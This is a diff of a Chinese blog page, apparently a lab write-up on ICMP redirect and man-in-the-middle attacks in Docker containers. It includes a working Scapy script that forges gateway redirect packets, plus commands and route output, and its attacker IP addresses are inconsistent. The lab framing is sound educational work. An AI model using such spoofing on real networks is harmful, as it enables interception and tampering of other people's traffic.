@@ -415,7 +415,7 @@ unicode: "f6d2"
       <tr>
           <td>真实路由器</td>
           <td>10.9.0.1</td>
-          <td>正常网络转发节点，作为对照路径</td>
+          <td>正常网络转发节点，作为初始网关</td>
       </tr>
       <tr>
           <td>恶意路由器</td>
@@ -427,13 +427,20 @@ unicode: "f6d2"
           <td>10.9.0.105</td>
           <td>伪造 ICMP Redirect 报文，并执行流量监听与篡改</td>
       </tr>
+      <tr>
+          <td>目标主机</td>
+          <td>192.168.60.5</td>
+          <td>受害者进行通信的主机</td>
+      </tr>
   </tbody>
 </table></div>
 <h2 id="icmp-重定向攻击">ICMP 重定向攻击
-</h2><p>ICMP Redirect 用于局域网优化路径。当主机将数据包发送给网关时，如果网关发现存在更优路径，会返回一个重定向报文，引导主机更新路由缓存。这个机制缺乏认证过程，只要报文结构合法且来源看似可信，就有可能被内核接受，因此可以伪造重定向来进行攻击</p>
-<p>攻击目标是修改受害者的路由缓存，将这个路由发往目标主机的流量转发到恶意路由器</p>
+</h2><p>ICMP Redirect 用于局域网优化路径。当主机将数据包发送给网关时，如果网关发现存在更优路径，会返回一个重定向报文，引导主机更新路由缓存，之后的数据包就会经过新的网关。这个机制缺乏认证过程，只要报文结构合法且来源看似可信，就有可能被内核接受，因此可以伪造重定向来进行攻击</p>
+<p><strong>攻击目标是修改受害者的路由缓存，让这个路由发往目标主机的流量途经恶意路由器</strong></p>
 <h3 id="受害者">受害者
-</h3><p>为了使ICMP重定向报文能够顺利通过受害者内核的合法性校验，需要让受害者持续向目标主机发送数据包</p>
+</h3><blockquote>
+<p>ICMP 重定向并不是无条件生效，需要存在对应的通信流量，否则内核可能直接忽略报文，因此必须让受害者与目标主机报保持通信，这样重定向才有机会实行</p>
+</blockquote>
 <p>进入受害者容器，执行ping命令且不中断</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -441,13 +448,27 @@ unicode: "f6d2"
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker exec -it victim-10.9.0.5 bash
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo docker <span class="nb">exec</span> -it victim-10.9.0.5 bash
 </span></span><span class="line"><span class="cl">ping 192.168.60.5
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>保持通信状态是触发内核接受重定向的前提</p>
+</div><img src="3.png" style="width: 100%;" />
 <h3 id="攻击者">攻击者
-</h3><p>首先写一个脚本<code>icmp_redirect.py</code>用来伪造来自网关的 Type 5 报文，指定受害者的流量发往恶意路由器</p>
+</h3><blockquote>
+<p>攻击者需要伪造来自网关的 ICMP Type 5 Redirect 报文，告诉受害者访问目标时改走新的路由。需要满足两个条件：重定向报文必须伪装成网关发送，以及报文中必须包含受害者当前正在进行的通信信息。一般通过抓包监听，ARP 欺骗，局域网嗅探等获取此信息</p>
+</blockquote>
+<p>进入攻击者容器</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">docker exec -it attacker-10.9.0.105 bash
+</span></span><span class="line"><span class="cl">cd /volumes
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>首先写一个脚本<code>icmp_redirect.py</code></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -467,48 +488,41 @@ unicode: "f6d2"
 </span><span class="lnt">15
 </span><span class="lnt">16
 </span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from scapy.all import *
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">victim_ip = &#34;10.9.0.5&#34;
-</span></span><span class="line"><span class="cl">router_ip = &#34;10.9.0.1&#34;
-</span></span><span class="line"><span class="cl">attacker_ip = &#34;10.9.0.111&#34;
-</span></span><span class="line"><span class="cl">target_ip = &#34;192.168.60.5&#34;
+</span></span><span class="line"><span class="cl"><span class="n">victim_ip</span> <span class="o">=</span> <span class="s2">&#34;10.9.0.5&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">router_ip</span> <span class="o">=</span> <span class="s2">&#34;10.9.0.1&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">attacker_ip</span> <span class="o">=</span> <span class="s2">&#34;10.9.0.111&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">target_ip</span> <span class="o">=</span> <span class="s2">&#34;192.168.60.5&#34;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">ip = IP(src=router_ip, dst=victim_ip)
+</span></span><span class="line"><span class="cl"><span class="c1"># 构造受害者正在通信的数据包</span>
+</span></span><span class="line"><span class="cl"><span class="n">send_packet</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="n">victim_ip</span><span class="p">,</span><span class="n">dst</span><span class="o">=</span><span class="n">target_ip</span><span class="p">)</span> <span class="o">/</span> <span class="n">ICMP</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">icmp = ICMP(type=5, code=1)
+</span></span><span class="line"><span class="cl"><span class="c1"># 网关发给受害者一个ICMP重定向并附带数据包</span>
+</span></span><span class="line"><span class="cl"><span class="n">redirect</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="n">router_ip</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">victim_ip</span><span class="p">)</span> <span class="o">/</span> \
+</span></span><span class="line"><span class="cl">           <span class="n">ICMP</span><span class="p">(</span><span class="nb">type</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span> <span class="n">code</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">gw</span><span class="o">=</span><span class="n">attacker_ip</span><span class="p">)</span> <span class="o">/</span> \
+</span></span><span class="line"><span class="cl">           <span class="n">send_packet</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">ip2 = IP(src=victim_ip, dst=target_ip)
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">send_packet = ip2 / ICMP()
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">redirect = IP(src=router_ip, dst=victim_ip) / \
-</span></span><span class="line"><span class="cl">           ICMP(type=5, code=1, gw=attacker_ip) / \
-</span></span><span class="line"><span class="cl">           send_packet
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">send(redirect, count=5, verbose=1)
+</span></span><span class="line"><span class="cl"><span class="c1"># 发送5次攻击报文</span>
+</span></span><span class="line"><span class="cl"><span class="n">send</span><span class="p">(</span><span class="n">redirect</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>进入攻击者容器，发送伪造的 ICMP 重定向报文</p>
+</div><p>发送伪造的 ICMP 重定向报文</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">docker exec -it attacker-10.9.0.105 bash
-</span></span><span class="line"><span class="cl">cd /volumes
-</span></span><span class="line"><span class="cl">python3 icmp_redirect.py
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python3 icmp_redirect.py
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="验证">验证
-</h3><p>攻击成功后，在受害者节点查看路由缓存：</p>
+</h3><blockquote>
+<p>原本受害者访问目标主机时的路径为<code>受害者&gt;网关&gt;目标主机</code>，攻击成功后会变成<code>受害者&gt;攻击者&gt;目标主机</code></p>
+</blockquote>
+<p>攻击成功后，停止受害者机器上的 ping 命令，在受害者容器查看路由缓存</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -517,16 +531,26 @@ unicode: "f6d2"
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ip route show
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>若出现如下条目：</p>
+</div><p>可以看到以下输出</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">192.168.60.5 via 10.9.0.111 dev eth0 cache &lt;redirected&gt;
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">default via 10.9.0.1 dev eth0 
+</span></span><span class="line"><span class="cl">10.9.0.0/24 dev eth0 proto kernel scope link src 10.9.0.5 
+</span></span><span class="line"><span class="cl">192.168.60.0/24 via 10.9.0.11 dev eth0 
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>说明路由已被修改，目标流量开始经过攻击者控制的节点。</p>
+</div><ul>
+<li>第一行说明默认网关是10.9.0.1</li>
+<li>第二行说明10.9.0.x 网段就在本地，不需要经过网关，可以直接发送</li>
+<li>第三行说明访问 192.168.60.x 网段时不走默认网关，而是发给 10.9.0.11</li>
+</ul>
+<p>说明路由已被修改，目标流量开始经过攻击者控制的节点。</p>
+<img src="4.png" style="width: 100%;" />
 <h2 id="中间人攻击mitm">中间人攻击（MITM）
 </h2><p>在路由被重定向后，攻击者已经处于通信路径中间，但默认情况下数据仍然是透明转发的，需要进一步介入数据处理流程。</p>
 <p>实验中直接在恶意路由器上对数据进行拦截和修改。</p>
@@ -607,6 +631,14 @@ unicode: "f6d2"
 <p>中间人攻击依赖对数据路径的完全接管，单纯的流量转发无法达到篡改效果，需要在内核转发与用户态处理之间做切换。</p>
 <p>从实现上看，攻击链条可以拆分为路径劫持与数据处理两个阶段，两者缺一不可。</p>
 </blockquote>
+<p>ICMP Redirect 并不是收到就一定会生效，Linux 内核会检查多个条件，包括：</p>
+<ul>
+<li>Redirect 是否来自默认网关</li>
+<li>当前是否确实存在对应通信</li>
+<li>Redirect 中携带的原始数据包是否合法</li>
+<li>新网关是否与本机处于同一网络</li>
+<li>路由是否允许被重定向</li>
+</ul>
 
 </section>
 
@@ -976,7 +1008,7 @@ unicode: "f6d2"
       共发表文章 
       <span class="number-highlight">24</span> 
       篇 ，总计 
-      <span class="number-highlight">88.42</span> 
+      <span class="number-highlight">88.77</span> 
       k 字
   </div>
   <div>
